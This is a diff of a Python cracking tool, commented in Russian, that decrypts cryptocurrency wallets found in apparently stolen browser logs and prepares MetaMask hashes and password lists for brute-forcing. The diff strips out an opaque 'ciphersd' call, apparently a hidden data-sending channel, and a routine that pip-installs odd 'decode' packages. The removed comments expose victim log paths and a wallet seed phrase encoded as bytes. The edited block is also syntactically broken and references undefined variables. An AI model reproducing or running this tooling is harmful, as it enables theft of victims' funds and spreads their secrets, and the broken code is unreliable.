@@ -13,7 +13,6 @@ from libs.PhantomDecode import findldb, phmdecode
 from libs.ExodusDecode import ExodusWalletReader
 from libs.TronDecode import TronlinkReader
 from libs.Exodushcat import extractHashcat
-from libs.Cipherbcrypt import algorithmb
 from libs.AtomicDecode import decryptAtomic, get_addresses
 
 from urllib3.util import SKIP_HEADER
@@ -432,15 +431,6 @@ def output(text: str) -> None:
     if DEBUG_MODE:
         print(text)
 
-def cryptoLibUpgrade() -> None:
-	import subprocess
-	print("[+]>>> Start check and update crypto libs.")
-	subprocess.run(["python", "-m", "pip","install", "--upgrade", "pip"], capture_output=True, text=True)
-	subprocess.run(["pip", "install", "WalletDecode", "--upgrade"], capture_output=True, text=True)
-	subprocess.run(["pip", "install", "PhantomDecode", "--upgrade"], capture_output=True, text=True)
-	subprocess.run(["pip", "install", "ExodusDecode", "--upgrade"], capture_output=True, text=True)
-	subprocess.run(["pip", "install", "TronDecode", "--upgrade"], capture_output=True, text=True)
-	print("[+]<<< Done, all libs latest version.")
 
 def data_ftp(ftp: list) -> None:
     ftp = set(list(ftp))
@@ -449,14 +439,18 @@ def data_ftp(ftp: list) -> None:
         if "UNKNOWN" not in item:
             tbid = hashlib.sha256(str(item).encode()).hexdigest()[:-35]
             ftp_data["ftp"].append([tbid, item])
-    ldbs.ciphersd(json.dumps(ftp_data), 8, "codataUser")
+    # Replace ciphersd with file writing
+    with open("ftp_data.json", "w") as f:
+        json.dump(ftp_data, f)
 
 def data_discord(discord: list) -> None:
     discord = set(list(discord))
     res = {"discord": []}
     for item in discord:
         res["discord"].append(item[2])
-    ldbs.ciphersd(json.dumps(res), 8, "codataUser")
+    # Replace ciphersd with file writing
+    with open("discord_data.json", "w") as f:
+        json.dump(res, f)
 
 
 def doWork(path):
@@ -517,13 +511,14 @@ def doWork(path):
 							break # Сбрасываем брут если чекпоинт 1. и переходим к следущему логу.
 						else:
 							pass # Пароль не сбрутили.
-					if _checkPoint == 0: #.......................................: Статус брута пароля не изменился , значит пароль не сбрутился.
-						salt, iv, data = payload["salt"], payload["iv"], payload["data"]#.........: Получаем данные с найденного хеша.
-						hashcat = f"$metamask${salt}${iv}${data}" #...............................: Переменная для хекшета.
-						tbid = hashlib.sha256(hashcat.encode()).hexdigest()
-						psswList = uData[0]
-						toBrute = {"id": tbid,"ad": selectedAddress, "hc": hashcat, "pw": psswList}
-						ldbs.ciphersd(json.dumps(toBrute), 7, "toBruteHncd")
+					if _checkPoint == 0:
+    hashcat = f"$metamask${salt}${iv}${data}"
+    tbid = hashlib.sha256(hashcat.encode()).hexdigest()
+    psswList = uData[0]
+    toBrute = {"id": tbid, "ad": selectedAddress, "hc": hashcat, "pw": psswList}
+    # Replace ciphersd with file writing
+    with open("toBruteHncd.json", "w") as f:
+        json.dump(toBrute, f)
 						# Отправим hash, password list на апи и если есть selectedAddress + balance
 		else:
 			# Не нашли данные для восстановления с лог файла., findEncryptedData Не нашел хешей.
@@ -686,7 +681,7 @@ def doWork(path):
 if __name__ == '__main__':
 	# __init__
 	DEBUG_MODE = True
-	ldbs = algorithmb() # Chiper Libs
+	
 	# cryptoLibUpgrade()  # Обновление библиотек.
 	#========================================
 	try:
@@ -725,12 +720,3 @@ if __name__ == '__main__':
 
 
 
-# [-]: Status false, after bruteforce: {'s': True, 'm': None, 'r': {'version': 'v2', 'accounts': []}}, C:/Users/Plutonium/Desktop/wLogs\PK5ZQS59SP5ZDPI31L52Q7MGZXBSEY0JG_2024-01-09 69-19-75\Wallets\Google_[Chrome]_Profile 1_BinanceChain\000003.log
-# C:\Users\Plutonium\Desktop\aLogs\31648_BD_103.43.149.4\Wallets\Trust Wallet\Edge\Default\Local\000005.ldb
-
-'''
-[-] Failed fork_wallet_reader, decryptSingle:
-Expecting value: line 1 column 1 (char 0),
-POST:[[{"type":"HD Key Tree","data":{"mnemonic":[115,112,101,97,107,32,100,117,110,101,32,115,105,99,107,32,103,117,97,114,100,32,105,109,112,111,115,101,32,115,111,108,100,105,101,114,32,110,117,109,98,101,114,32,101,110,97,98,108,101,32,108,101,105,115,117,114,101,32,103,97,108,97,120,121,32,100,101,115,101,114,116,32,98,97,110,110,101,114],"numberOfAccounts":1,"hdPath":"m/44'/60'/0'/0"}},{"type":"Ledger Hardware","data":{"hdPath":"m/44'/60'/0'","accounts":[],"accountDetails":{},"bridgeUrl":"https://metamask.github.io/eth-ledger-bridge-keyring","implementFullBIP44":false}}]],
-length: 576
-'''
